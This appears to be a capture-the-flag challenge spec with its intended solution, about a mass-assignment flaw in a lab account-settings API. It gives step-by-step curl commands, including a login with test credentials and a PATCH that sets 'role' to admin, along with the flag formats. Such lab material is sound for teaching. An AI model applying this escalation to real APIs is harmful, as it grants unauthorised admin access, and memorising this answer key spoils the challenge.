# api/mass-assign-esc — MassAssignEsc (stage-gated, high, 2 flags)

**Acctly** account settings API. `PATCH /api/v1/me` blindly copies client-supplied fields onto your account record — including `role` (mass assignment; the web form only exposes display name + company). Stage 1: escalate your own account, then `GET /api/v1/me` reflects `role: admin` and releases flag1. Stage 2: `GET /api/v1/admin/panel` re-verifies the role server-side (from the DB row) and releases flag2.

Why exploitable: no allowlist between the request body and the model — a trust-boundary violation on writable fields. Stage 2 is impossible without stage 1: the panel reads the persisted DB role, and `role` is only settable through the flawed PATCH (the seeded admin password is out of player scope).

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login`
2. Baseline: `curl -s -b jar http://victim.target.lab:8119/api/v1/me` → `role: tester` (panel returns 403).
3. Stage 1 — mass-assign the role: `curl -s -b jar -X PATCH -H 'Content-Type: application/json' -d '{"role":"admin"}' http://victim.target.lab:8119/api/v1/me`
4. `curl -s -b jar http://victim.target.lab:8119/api/v1/me` → `role: admin` + `enterprise_notice` = **flag1** `DSLTV{API-MassAssignEsc-<9 digits>}`.
5. Stage 2: `curl -s -b jar http://victim.target.lab:8119/api/v1/admin/panel` → `audit_key` = **flag2** `DSLTV{API-MassAssignAdmin-<9 digits>}`.
